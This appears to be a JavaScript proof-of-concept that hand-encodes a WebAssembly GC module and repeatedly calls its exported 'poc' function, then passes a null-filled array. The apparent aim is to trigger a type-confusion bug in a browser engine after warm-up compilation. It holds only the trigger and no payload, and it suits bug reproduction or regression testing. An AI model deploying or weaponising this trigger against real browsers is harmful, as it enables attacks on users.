let wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0f, 0x04, 0x5f,
  0x00, 0x5e, 0x6c, 0x00, 0x5e, 0x6b, 0x00, 0x60, 0x01, 0x6b, 0x02, 0x01,
  0x7f, 0x03, 0x02, 0x01, 0x03, 0x07, 0x17, 0x03, 0x03, 0x70, 0x6f, 0x63,
  0x00, 0x00, 0x05, 0x74, 0x79, 0x70, 0x65, 0x30, 0x01, 0x00, 0x05, 0x74,
  0x79, 0x70, 0x65, 0x32, 0x01, 0x02, 0x0a, 0x0b, 0x01, 0x09, 0x00, 0x20,
  0x00, 0x17, 0x01, 0x1a, 0x41, 0x00, 0x0b
]);

let module = new WebAssembly.Module(wasm_code);
let instance = new WebAssembly.Instance(module, {});
let exports = instance.exports;

const struct_type = exports.type0;
const array_type = exports.type2;

const s_instance = new WebAssembly.Struct(struct_type, []);
const warm_up_array = new WebAssembly.Array(array_type, {
  length: 1,
  initial: s_instance
});
const trigger_array = new WebAssembly.Array(array_type, {
  length: 1,
  initial: null
});

for (let i = 0; i < 100; i++) {
  let param = warm_up_array;
  if (i === 99) {
    param = trigger_array;
  }
  try {
    exports.poc(param);
  } catch (e) {}
}